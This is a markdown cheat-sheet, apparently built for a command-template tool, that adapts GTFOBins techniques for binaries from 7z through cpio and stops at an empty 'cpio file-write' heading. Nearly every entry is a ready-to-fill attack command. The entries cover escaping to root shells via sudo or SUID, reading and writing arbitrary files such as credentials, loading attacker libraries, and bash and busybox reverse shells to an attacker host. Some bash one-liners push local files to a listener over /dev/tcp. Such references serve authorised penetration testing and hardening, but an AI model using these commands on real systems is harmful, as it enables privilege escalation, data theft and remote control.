# Gtfobins

Reference for [GTFOBins](https://gtfobins.github.io/) techniques. Each entry shows the canonical exploit code parameterized for the cheat system. Variables (`$lhost`, `$lport`, `$file_in`, `$file_out`, `$data`, `$lib`) prompt at runtime; `$scheme` and tun IP come from `common.md`.

## 7z

### 7z file-read

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
7z a -ttar -an -so $file_in | 7z e -ttar -si -so
```
<!-- cheat
var file_in
-->

## R

### R shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
R --no-save -e 'system("/bin/sh")'
```
<!-- cheat
-->

## aa-exec

### aa-exec shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
aa-exec /bin/sh
```
<!-- cheat
-->

## ab

### ab download

Pull a remote file to disk.

```sh title:"sudo / suid / unprivileged"
ab -v2 $scheme://$lhost$file_in
```
<!-- cheat
import tun_ip
import scheme
var file_in
-->

### ab upload

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
ab -p $file_in $scheme://$lhost/
```
<!-- cheat
import tun_ip
import scheme
var file_in
-->

## acr

### acr command

Execute an arbitrary non-interactive command.

```sh title:"sudo / suid / unprivileged"
echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >$tmp_file
chmod +x $tmp_file
acr -r $tmp_file
```
<!-- cheat
var tmp_file
-->

## agetty

### agetty shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"suid"
agetty -l /bin/sh -o -p -a root tty
```
<!-- cheat
-->

## alpine

### alpine file-read

The file is displayed in the terminal interface. Other options might be available, for example, by pressing `S` is possible to save the file content elsewhere.

```sh title:"sudo / suid / unprivileged"
alpine -F $file_in
```
<!-- cheat
var file_in
-->

## ansible-playbook

### ansible-playbook shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$tmp_file
ansible-playbook $tmp_file
```
<!-- cheat
var tmp_file
-->

## ansible-test

### ansible-test shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
ansible-test shell
```
<!-- cheat
-->

## aoss

### aoss shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
aoss /bin/sh
```
<!-- cheat
-->

## apache2

### apache2 file-read #1

The first line may be leaked as an error message.

```sh title:"sudo / suid / unprivileged"
apache2 -f $file_in
```
<!-- cheat
var file_in
-->

### apache2 file-read #2

The first line may be leaked as an error message.

```sh title:"sudo / suid / unprivileged"
apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include $file_in'
```
<!-- cheat
var file_in
-->

## apache2ctl

### apache2ctl file-read

The first line only is likely leaked as an error message.

```sh title:"sudo / unprivileged"
apache2ctl -c 'Include $file_in'
```
<!-- cheat
var file_in
-->

## apport-cli

### apport-cli inherit (inherits from less)

The terminal interface expects some choices in order to spawn tha pager.

```sh title:"unprivileged"
apport-cli -f
1
2
v
```
<!-- cheat
-->

## apt

Alias of [apt-get](#apt_get). All techniques from `apt-get` apply.

## apt-get

### apt-get shell #1

For this to work the target package (i.e., `sl`) must not be already installed.

```sh title:"sudo / suid"
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >$tmp_file
apt-get -y install -c $tmp_file sl
```
<!-- cheat
var tmp_file
-->

### apt-get shell #2

When the shell exits the `update` command is actually executed.

```sh title:"sudo / suid"
apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```
<!-- cheat
-->

### apt-get inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
apt-get changelog apt
```
<!-- cheat
-->

## aptitude

### aptitude inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
aptitude changelog aptitude
```
<!-- cheat
-->

## ar

### ar file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
ar r $file_out $file_in
ar p $file_out
```
<!-- cheat
var file_in
var file_out
-->

## arch-nspawn

### arch-nspawn shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo"
mkdir -p ./etc/
grep -oP "^CHROOT_VERSION='\K[^']+" /usr/share/devtools/lib/archroot.sh >.arch-chroot
touch ./etc/pacman.conf
echo 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf
arch-nspawn .
```
<!-- cheat
-->

## aria2c

### aria2c command #1

Note that the subprocess is immediately sent to the background.

```sh title:"sudo / suid / unprivileged"
echo $cmd_file >$tmp_file
chmod +x $tmp_file
aria2c --on-download-error=$tmp_file http://some-invalid-domain
```
<!-- cheat
var cmd_file
var tmp_file
-->

### aria2c command #2

The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script, e.g., `$cmd_file`. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.

```sh title:"sudo / suid / unprivileged"
aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh $scheme://$lhost/aaaaaaaaaaaaaaaa
```
<!-- cheat
import tun_ip
import scheme
-->

### aria2c file-read

The file is leaked as error messages.

```sh title:"sudo / suid / unprivileged"
aria2c -i $file_in
```
<!-- cheat
var file_in
-->

### aria2c download

Use `--allow-overwrite` if needed. Similarly `-o $file_out` can be omitted, in that case the file is saved to `input-file` in the current working directory.

```sh title:"sudo / suid / unprivileged"
aria2c -o $file_out $scheme://$lhost$file_in
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

## arj

### arj file-read

The `.arj` suffix will be added to `output-file`.

```sh title:"sudo / suid / unprivileged"
arj a $file_out $file_in
arj p $file_out
```
<!-- cheat
var file_in
var file_out
-->

### arj file-write

The `.arj` suffix will be added to `x`.

```sh title:"sudo / suid / unprivileged"
echo $data >output-file
arj a x output-file
arj e x $dir_out/
```
<!-- cheat
var data
var dir_out
-->

## arp

### arp file-read

Lines are likely leaked as error messages.

```sh title:"sudo / suid / unprivileged"
arp -v -f $file_in
```
<!-- cheat
var file_in
-->

## as

### as file-read

Lines are likely leaked as error messages.

```sh title:"sudo / suid / unprivileged"
as @$file_in
```
<!-- cheat
var file_in
-->

## ascii-xfr

### ascii-xfr file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
ascii-xfr -ns $file_in
```
<!-- cheat
var file_in
-->

## ascii85

### ascii85 file-read

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
ascii85 $file_in | ascii85 --decode
```
<!-- cheat
var file_in
-->

## ash

### ash shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
ash
```
<!-- cheat
-->

#### ash shell - suid override

```sh title:"suid variant"
ash -p
```
<!-- cheat
-->

### ash file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
ash -c 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

#### ash file-write - suid override

```sh title:"suid variant"
ash -p -c 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

## aspell

### aspell file-read #1

The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words.

```sh title:"sudo / suid / unprivileged"
aspell -c $file_in
```
<!-- cheat
var file_in
-->

### aspell file-read #2

The first word is likely displayed as error messaged, and converted to lowercase.

```sh title:"sudo / suid / unprivileged"
aspell --conf $file_in
```
<!-- cheat
var file_in
-->

## asterisk

### asterisk shell

A server instance must be already running, otherwise it can be started with `sudo asterisk -F`. Moreover, the invoking user must be able to access the socket.

```sh title:"sudo / suid / unprivileged"
asterisk -r
!/bin/sh
```
<!-- cheat
-->

## at

### at shell

`tail` is used to pause the terminal.

```sh title:"sudo / unprivileged"
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```
<!-- cheat
-->

### at command

Execute an arbitrary non-interactive command.

```sh title:"sudo / unprivileged"
echo $cmd_file | at now
```
<!-- cheat
var cmd_file
-->

## atobm

### atobm file-read

Outputs only the first line of the file to standard error without the `-` and `#` characters, this can be customized with the `-c` option, by default is `-c -#`. Content can be retrieved with `awk -F "'" '{printf "%s", $2}'`.

```sh title:"sudo / suid / unprivileged"
atobm $file_in
```
<!-- cheat
var file_in
-->

## autoconf

### autoconf shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
echo /bin/sh >$tmp_file
chmod +x $tmp_file
touch configure.ac
AUTOM4TE=$tmp_file autoconf
```
<!-- cheat
var tmp_file
-->

## autoheader

### autoheader shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
echo '/bin/sh 1>&0' >$tmp_file
chmod +x $tmp_file
touch configure.ac
AUTOM4TE=$tmp_file autoheader
```
<!-- cheat
var tmp_file
-->

## autoreconf

### autoreconf shell

The shell is invoked multiple times.

```sh title:"sudo / unprivileged"
echo '/bin/sh 1>&0' >$tmp_file
chmod +x $tmp_file
echo AC_INIT >configure.ac
AUTOM4TE=$tmp_file autoreconf
```
<!-- cheat
var tmp_file
-->

## awk

Alias of [mawk](#mawk). All techniques from `mawk` apply.

## aws

### aws file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
aws ec2 describe-instances --filter file://$file_in
```
<!-- cheat
var file_in
-->

### aws inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
aws help
```
<!-- cheat
-->

## base32

### base32 file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
base32 $file_in | base32 --decode
```
<!-- cheat
var file_in
-->

## base58

### base58 file-read

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
base58 $file_in | base58 --decode
```
<!-- cheat
var file_in
-->

## base64

### base64 file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
base64 $file_in | base64 --decode
```
<!-- cheat
var file_in
-->

## basenc

### basenc file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
basenc --base64 $file_in | basenc -d --base64
```
<!-- cheat
var file_in
-->

## basez

### basez file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
basez $file_in | basez --decode
```
<!-- cheat
var file_in
-->

## bash

### bash shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
bash
```
<!-- cheat
-->

#### bash shell - suid override

```sh title:"suid variant"
bash -p
```
<!-- cheat
-->

### bash reverse-shell

Connect back to an attacker-controlled listener.

```sh title:"sudo / suid / unprivileged"
bash -c 'exec bash -i &>/dev/tcp/$lhost/$lport <&1'
```
<!-- cheat
import tun_ip
import lports
-->

#### bash reverse-shell - suid override

```sh title:"suid variant"
bash -p -c 'exec bash -p -i &>/dev/tcp/$lhost/$lport <&1'
```
<!-- cheat
import tun_ip
import lports
-->

### bash file-read #1

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
bash -c 'echo "$(<$file_in)"'
```
<!-- cheat
var file_in
-->

#### bash file-read #1 - suid override

```sh title:"suid variant"
bash -p -c 'echo "$(<$file_in)"'
```
<!-- cheat
var file_in
-->

### bash file-read #2

This only works interactively from an existing `bash` session.

```sh title:"sudo / suid / unprivileged"
HISTTIMEFORMAT=$'\r\e[K'
history -c
history -r $file_in
history
```
<!-- cheat
var file_in
-->

### bash file-write #1

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
bash -c 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

#### bash file-write #1 - suid override

```sh title:"suid variant"
bash -p -c 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

### bash file-write #2

This only works interactively from an existing `bash` session. It adds timestamps to the output file.

```sh title:"sudo / suid / unprivileged"
HISTIGNORE='history *'
history -c
$data
history -w $file_out
```
<!-- cheat
var data
var file_out
-->

### bash download #1

Pull a remote file to disk.

```sh title:"sudo / suid / unprivileged"
bash -c '{ echo -ne "GET $file_in HTTP/1.0\r\nhost: $lhost\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$lhost/$lport \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >$file_out'
```
<!-- cheat
import tun_ip
import lports
var file_in
var file_out
-->

#### bash download #1 - suid override

```sh title:"suid variant"
bash -p -c '{ echo -ne "GET $file_in HTTP/1.0\r\nhost: $lhost\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$lhost/$lport \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >$file_out'
```
<!-- cheat
import tun_ip
import lports
var file_in
var file_out
-->

### bash download #2

Pull a remote file to disk.

```sh title:"sudo / suid / unprivileged"
bash -c 'echo "$(</dev/tcp/$lhost/$lport) >$file_out'
```
<!-- cheat
import tun_ip
import lports
var file_out
-->

#### bash download #2 - suid override

```sh title:"suid variant"
bash -p -c 'echo "$(</dev/tcp/$lhost/$lport) >$file_out'
```
<!-- cheat
import tun_ip
import lports
var file_out
-->

### bash upload #1

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
bash -c 'echo -e "POST / HTTP/0.9\n\n$(<$file_in)" >/dev/tcp/$lhost/$lport'
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

#### bash upload #1 - suid override

```sh title:"suid variant"
bash -p -c 'echo -e "POST / HTTP/0.9\n\n$(<$file_in)" >/dev/tcp/$lhost/$lport'
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

### bash upload #2

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
bash -c 'echo -n "$(<$file_in)" >/dev/tcp/$lhost/$lport'
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

#### bash upload #2 - suid override

```sh title:"suid variant"
bash -p -c 'echo -n "$(<$file_in)" >/dev/tcp/$lhost/$lport'
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

### bash library-load

Load an attacker-supplied shared library.

```sh title:"sudo / suid / unprivileged"
bash -c 'enable -f $lib x'
```
<!-- cheat
var lib
-->

#### bash library-load - suid override

```sh title:"suid variant"
bash -p -c 'enable -f $lib x'
```
<!-- cheat
var lib
-->

## bashbug

### bashbug inherit (inherits from vi)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
bashbug
```
<!-- cheat
-->

## batcat

### batcat inherit (inherits from less)

`--paging always` can be omitted provided that the output doesn't fit the screen.

```sh title:"sudo / suid / unprivileged"
batcat --paging always /etc/hosts
```
<!-- cheat
-->

## bbot

### bbot file-read

The file is displayed in the debug log.

```sh title:"sudo / unprivileged"
bbot -d -cy $file_in
```
<!-- cheat
var file_in
-->

## bc

### bc file-read

The file content is actually parsed and appears as error messages.

```sh title:"sudo / suid / unprivileged"
bc -s $file_in
quit
```
<!-- cheat
var file_in
-->

## bconsole

### bconsole shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
bconsole
@exec /bin/sh
```
<!-- cheat
-->

### bconsole file-read

The file is actually parsed and the first wrong line is returned in an error message.

```sh title:"sudo / suid / unprivileged"
bconsole -c $file_in
```
<!-- cheat
var file_in
-->

## bee

### bee inherit (inherits from php)

This allows to run PHP code (`...`).  This must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`), alternatively use the `--root` option.

```sh title:"sudo / suid / unprivileged"
bee eval '...'
```
<!-- cheat
-->

## borg

### borg shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
borg extract @:/::: --rsh "/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'"
```
<!-- cheat
-->

## bpftrace

### bpftrace shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo"
bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
```
<!-- cheat
-->

### bpftrace shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo"
echo 'BEGIN {system("/bin/sh 1<&0");exit()}' >$tmp_file
bpftrace --unsafe $tmp_file
```
<!-- cheat
var tmp_file
-->

### bpftrace shell #3

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo"
bpftrace -c /bin/sh -e 'END {exit()}'
```
<!-- cheat
-->

## bridge

### bridge file-read

Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error.

```sh title:"sudo / suid / unprivileged"
bridge -b $file_in
```
<!-- cheat
var file_in
-->

## bundle

### bundle shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
BUNDLE_GEMFILE=x bundle exec /bin/sh
```
<!-- cheat
-->

### bundle shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
touch Gemfile
bundle exec /bin/sh
```
<!-- cheat
-->

### bundle shell #3

This might run the shell twice, one after the other.

```sh title:"sudo / unprivileged"
echo 'system("/bin/sh")' >Gemfile
bundle install
```
<!-- cheat
-->

### bundle inherit #1 (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
bundle help
```
<!-- cheat
-->

### bundle inherit #2 (inherits from irb)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
touch Gemfile
bundle console
```
<!-- cheat
-->

## bundler

Alias of [bundle](#bundle). All techniques from `bundle` apply.

## busctl

### busctl shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```
<!-- cheat
-->

#### busctl shell #1 - suid override

```sh title:"suid variant"
busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
```
<!-- cheat
-->

### busctl shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```
<!-- cheat
-->

#### busctl shell #2 - suid override

```sh title:"suid variant"
busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
```
<!-- cheat
-->

### busctl inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / suid / unprivileged"
busctl --show-machine
```
<!-- cheat
-->

## busybox

BusyBox may contain many utilities, run `busybox --list-full` to check what other binaries are supported.

### busybox reverse-shell

Connect back to an attacker-controlled listener.

```sh title:"sudo / unprivileged"
busybox nc -e /bin/sh $lhost $lport
```
<!-- cheat
import tun_ip
import lports
-->

### busybox upload

This serves files in the local folder via an HTTP server.

```sh title:"sudo / unprivileged"
busybox httpd -f -p $lport -h .
```
<!-- cheat
import lports
-->

### busybox inherit #1 (inherits from ash)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
busybox ash
```
<!-- cheat
-->

### busybox inherit #2 (inherits from cat)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
busybox cat
```
<!-- cheat
-->

## byebug

### byebug inherit (inherits from ruby)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
byebug --no-stop $script
```
<!-- cheat
var script
-->

## bzip2

There are also a number of other utilities that rely on `bzip2` under the hood, e.g., `bzless`, `bzcat`, `bunzip2`, etc. Besides having similar features, they also allow privileged reads if `bzip2` itself is SUID.

### bzip2 file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
bzip2 -c $file_in | bzip2 -d
```
<!-- cheat
var file_in
-->

## c89

Alias of [gcc](#gcc). All techniques from `gcc` apply.

## c99

Alias of [gcc](#gcc). All techniques from `gcc` apply.

## cabal

### cabal shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
cabal exec --project-file=/dev/null -- /bin/sh
```
<!-- cheat
-->

#### cabal shell - suid override

```sh title:"suid variant"
cabal exec --project-file=/dev/null -- /bin/sh -p
```
<!-- cheat
-->

## cancel

### cancel upload

Data is sent as a POST request along with other content.

```sh title:"sudo / suid / unprivileged"
cancel -h $lhost:$lport -u $data
```
<!-- cheat
import tun_ip
import lports
var data
-->

## capsh

### capsh shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
capsh --
```
<!-- cheat
-->

#### capsh shell - suid override

```sh title:"suid variant"
capsh --gid=0 --uid=0 --
```
<!-- cheat
-->

## cargo

### cargo inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
cargo help doc
```
<!-- cheat
-->

## cat

### cat file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
cat $file_in
```
<!-- cheat
var file_in
-->

## cc

Alias of [gcc](#gcc). All techniques from `gcc` apply.

## cdist

### cdist shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
cdist shell -s /bin/sh
```
<!-- cheat
-->

## certbot

### certbot shell

This needs a writable directory, replace `.` if needed.

```sh title:"sudo / unprivileged"
certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'
```
<!-- cheat
-->

## chattr

### chattr privilege-escalation

Make the target file immutable.

```sh title:"sudo / suid"
chattr +i $file_in
```
<!-- cheat
var file_in
-->

## check_by_ssh

This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

### check_by_ssh shell

The shell will only last 10 seconds.

```sh title:"sudo / unprivileged"
check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x
```
<!-- cheat
-->

## check_cups

This is the `check_cups` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

### check_cups file-read

The read file content is limited to the first line.

```sh title:"sudo / unprivileged"
check_cups --extra-opts=@$file_in
```
<!-- cheat
var file_in
-->

## check_log

This is the `check_log` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

### check_log file-read

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
check_log -F $file_in -O /dev/stdout
```
<!-- cheat
var file_in
-->

### check_log file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / unprivileged"
check_log -F $file_in -O $file_out
```
<!-- cheat
var file_in
var file_out
-->

## check_memory

This is the `check_memory` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

### check_memory file-read

The read file content is limited to the first line.

```sh title:"sudo / unprivileged"
check_memory --extra-opts=@$file_in
```
<!-- cheat
var file_in
-->

## check_raid

This is the `check_raid` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

### check_raid file-read

The read file content is limited to the first line.

```sh title:"sudo / unprivileged"
check_raid --extra-opts=@$file_in
```
<!-- cheat
var file_in
-->

## check_ssl_cert

This is the `check_ssl_cert` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

### check_ssl_cert shell

The shell will be invoked multiple times.

```sh title:"sudo / unprivileged"
echo 'exec /bin/sh 0<&2 1>&2' >$tmp_file
chmod +x $tmp_file
check_ssl_cert --grep-bin $tmp_file -H x
```
<!-- cheat
var tmp_file
-->

## check_statusfile

This is the `check_statusfile` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

### check_statusfile file-read

The read file content is limited to the first line.

```sh title:"sudo / unprivileged"
check_statusfile $file_in
```
<!-- cheat
var file_in
-->

## chmod

### chmod privilege-escalation

This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.

```sh title:"sudo / suid"
chmod 6777 $file_in
```
<!-- cheat
var file_in
-->

## choom

### choom shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
choom -n 0 /bin/sh
```
<!-- cheat
-->

#### choom shell - suid override

```sh title:"suid variant"
choom -n 0 -- /bin/sh -p
```
<!-- cheat
-->

## chown

### chown privilege-escalation

This can be run with elevated privileges to change ownership and then read, write, or execute a file.

```sh title:"sudo / suid"
chown $(id -un):$(id -gn) $file_in
```
<!-- cheat
var file_in
-->

## chroot

### chroot shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid"
chroot /
```
<!-- cheat
-->

#### chroot shell - suid override

```sh title:"suid variant"
chroot / /bin/sh -p
```
<!-- cheat
-->

## chrt

### chrt shell

Any number between 1 and 99 will do.

```sh title:"sudo / suid / unprivileged"
chrt 1 /bin/sh
```
<!-- cheat
-->

#### chrt shell - suid override

```sh title:"suid variant"
chrt 1 /bin/sh -p
```
<!-- cheat
-->

## clamscan

### clamscan file-read

Each line of the file is interpreted as a path and the content is leaked via error messages. The output can optionally be cleaned using `sed`.

```sh title:"sudo / suid / unprivileged"
touch x.yara
clamscan --no-summary -d x.yara -f $file_in 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
```
<!-- cheat
var file_in
-->

## clisp

### clisp shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
```
<!-- cheat
-->

## cmake

### cmake shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
echo 'execute_process(COMMAND /bin/sh)' >$cmake_file
cmake $path
```
<!-- cheat
var cmake_file
var path
-->

### cmake file-read

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
cmake -E cat $file_in
```
<!-- cheat
var file_in
-->

## cmp

### cmp file-read

Dump the bytes of the input file that are different from the NUL byte in a tabular format.

```sh title:"sudo / suid / unprivileged"
cmp $file_in /dev/zero -b -l
```
<!-- cheat
var file_in
-->

## cobc

### cobc shell

The `$tmp_file` sill be overwritten after the execution.

```sh title:"sudo / suid / unprivileged"
echo 'CALL "SYSTEM" USING "/bin/sh".' >$tmp_file
cobc -xFj --frelax-syntax-checks $tmp_file
```
<!-- cheat
var tmp_file
-->

## code

### code reverse-shell

This requires a valid GitHub account.  Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.

```sh title:"sudo / unprivileged"
code tunnel --name xxxxxx
```
<!-- cheat
-->

### code download

This requires a valid GitHub account.  Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.

```sh title:"sudo / unprivileged"
code tunnel --name xxxxxx
```
<!-- cheat
-->

### code upload

This requires a valid GitHub account.  Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.

```sh title:"sudo / unprivileged"
code tunnel --name xxxxxx
```
<!-- cheat
-->

## codex

### codex shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
codex sandbox linux /bin/sh
```
<!-- cheat
-->

## column

### column file-read

This program expects textual data.

```sh title:"sudo / suid / unprivileged"
column $file_in
```
<!-- cheat
var file_in
-->

## comm

### comm file-read

A newline is appended to the file.

```sh title:"sudo / suid / unprivileged"
comm $file_in /dev/null
```
<!-- cheat
var file_in
-->

## composer

### composer shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
echo '{"scripts":{"x":"/bin/sh"}}' >composer.json
composer run-script x
```
<!-- cheat
-->

## cowsay

### cowsay inherit (inherits from perl)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
cowsay -f $script x
```
<!-- cheat
var script
-->

## cowthink

### cowthink inherit (inherits from perl)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
cowthink -f $script x
```
<!-- cheat
var script
-->

## cp

### cp file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
cp $file_in /dev/stdout
```
<!-- cheat
var file_in
-->

### cp file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
echo $data | cp /dev/stdin $file_out
```
<!-- cheat
var data
var file_out
-->

### cp privilege-escalation #1

This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)

```sh title:"sudo / suid"
cp $file_in $file_out
```
<!-- cheat
var file_in
var file_out
-->

### cp privilege-escalation #2

This can copy SUID permissions from any SUID binary (e.g., `$file_in`) to another.

```sh title:"sudo / suid"
cp --attributes-only --preserve=all $file_in $file_out
```
<!-- cheat
var file_in
var file_out
-->

## cpan

### cpan inherit (inherits from perl)

Perl code can be executed with the `!` command.

```sh title:"sudo / unprivileged"
cpan
! ...
```
<!-- cheat
-->

## cpio

### cpio shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo"
echo '/bin/sh </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:
```
<!-- cheat
-->

### cpio file-read #1

The content of the file is printed to standard output, between the `cpio` archive format header and footer.

```sh title:"sudo / suid / unprivileged"
echo $file_in | cpio -o
```
<!-- cheat
var file_in
-->

### cpio file-read #2

The whole directory structure is copied to `.`, hence this is also a file write.

```sh title:"sudo / suid / unprivileged"
echo $file_in | cpio -dp .
cat $file_in
```
<!-- cheat
var file_in
-->

#### cpio file-read #2 - sudo override

```sh title:"sudo variant"
echo $file_in | cpio -R $UID -dp .
cat $file_in
```
<!-- cheat
var file_in
-->

#### cpio file-read #2 - suid override

```sh title:"suid variant"
echo $file_in | cpio -R $UID -dp .
cat $file_in
```
<!-- cheat
var file_in
-->

### cpio file-write

